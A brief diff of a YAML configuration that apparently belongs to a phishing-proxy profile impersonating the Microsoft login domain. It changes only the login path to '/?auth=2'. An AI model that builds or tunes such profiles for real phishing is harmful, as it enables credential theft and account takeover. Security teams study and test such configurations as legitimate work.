@@ -80,7 +80,7 @@ credentials:
 
 login:
   domain: "login.microsoftonline.com"
-  path: "/"
+  path: "/?auth=2"
 
 rewrite_urls:
   - trigger:
